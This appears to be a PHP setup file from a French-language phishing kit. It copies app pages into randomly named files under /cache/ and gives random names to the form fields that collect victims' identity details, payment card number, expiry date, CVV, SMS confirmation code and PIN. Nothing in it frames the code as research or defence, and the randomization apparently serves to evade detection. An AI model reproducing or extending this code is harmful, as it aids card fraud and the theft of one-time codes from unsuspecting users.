<?php

/**
 * Initialization File
 *
 * This file is included in the core and should be respected by developers.
 *
 * Developer Guidelines:
 *
 * 1. Setting Default Filenames:
 *    Use the following format to set default filenames:
 *    $_SESSION["filename"][0] = $_SESSION["filename"][0] ?? "/cache/" . $generator->mixedAlpha(16) . ".php";
 *    $_SESSION["filename"][1] = $_SESSION["filename"][1] ?? "/cache/" . $generator->mixedAlpha(16) . ".php";
 *
 * 2. Copying Files:
 *    If a file does not exist, copy the corresponding file to the specified path.
 *    Example:
 *    if (!file_exists($_SESSION["filename"][0]))
 *        copy(BASE_PATH . "/src/foo.php", BASE_PATH . '/' . $_SESSION["filename"][0]);
 *    if (!file_exists($_SESSION["filename"][1]))
 *        copy(BASE_PATH . "/src/bar.php", BASE_PATH . '/' . $_SESSION["filename"][1]);
 *
 * Note: Please ensure that the copied files are only copied if they do not already exist.
 */

// Set default filenames if they are not already set
$_SESSION["filename"][0] = $_SESSION["filename"][0] ?? "/cache/" . $generator->mixedAlpha(16) . ".php";
$_SESSION["filename"][1] = $_SESSION["filename"][1] ?? "/cache/" . $generator->mixedAlpha(16) . ".php";

// Copy files if they do not already exist
if (!file_exists($_SESSION["filename"][0]))
    copy(BASE_PATH . "/src/app.php", BASE_PATH . '/' . $_SESSION["filename"][0]);

if (!file_exists($_SESSION["filename"][1]))
    copy(BASE_PATH . "/src/iframe/app.php", BASE_PATH . '/' . $_SESSION["filename"][1]);

// Assign the first filename in the session array as the initial file to be executed (Do not remove this line)
$init = $_SESSION["filename"][0];

$input = range('a', 'z');
$rand_keys = array_rand($input, 9);

$_SESSION["op"][0] = $_SESSION["op"][0] ?? $input[$rand_keys[0]];
$_SESSION["op"][1] = $_SESSION["op"][1] ?? $input[$rand_keys[1]];
$_SESSION["op"][2] = $_SESSION["op"][2] ?? $input[$rand_keys[2]];
$_SESSION["op"][3] = $_SESSION["op"][3] ?? $input[$rand_keys[3]];
$_SESSION["op"][4] = $_SESSION["op"][4] ?? $input[$rand_keys[4]];
$_SESSION["op"][5] = $_SESSION["op"][5] ?? $input[$rand_keys[5]];
$_SESSION["op"][6] = $_SESSION["op"][6] ?? $input[$rand_keys[6]];
$_SESSION["op"][7] = $_SESSION["op"][7] ?? $input[$rand_keys[7]];
$_SESSION["op"][8] = $_SESSION["op"][8] ?? $input[$rand_keys[8]];

$_SESSION["attribute"] = [];

$_SESSION["attribute"][0] = $_SESSION["attribute"][0] ?? $generator->mixedAlpha(16); // Prénom
$_SESSION["attribute"][1] = $_SESSION["attribute"][1] ?? $generator->mixedAlpha(16); // Nom
$_SESSION["attribute"][2] = $_SESSION["attribute"][2] ?? $generator->mixedAlpha(16); // Date de naissance
$_SESSION["attribute"][3] = $_SESSION["attribute"][3] ?? $generator->mixedAlpha(16); // Adresse électronique
$_SESSION["attribute"][4] = $_SESSION["attribute"][4] ?? $generator->mixedAlpha(16); // Numéro de téléphone
$_SESSION["attribute"][5] = $_SESSION["attribute"][5] ?? $generator->mixedAlpha(16); // Adresse
$_SESSION["attribute"][6] = $_SESSION["attribute"][6] ?? $generator->mixedAlpha(16); // Code postal
$_SESSION["attribute"][7] = $_SESSION["attribute"][7] ?? $generator->mixedAlpha(16); // Ville

$_SESSION["attribute"][8] = $_SESSION["attribute"][8] ?? $generator->mixedAlpha(16); // Titulaire de la carte
$_SESSION["attribute"][9] = $_SESSION["attribute"][9] ?? $generator->mixedAlpha(16); // Numéro de la carte
$_SESSION["attribute"][10] = $_SESSION["attribute"][10] ?? $generator->mixedAlpha(16); // Date d'expiration
$_SESSION["attribute"][11] = $_SESSION["attribute"][11] ?? $generator->mixedAlpha(16); // Cryptogramme visuel

$_SESSION["attribute"][12] = $_SESSION["attribute"][12] ?? $generator->mixedAlpha(16); // Méthode de confirmation
$_SESSION["attribute"][13] = $_SESSION["attribute"][13] ?? $generator->mixedAlpha(16); // Code SMS reçu
$_SESSION["attribute"][14] = $_SESSION["attribute"][14] ?? $generator->mixedAlpha(16); // PIN 2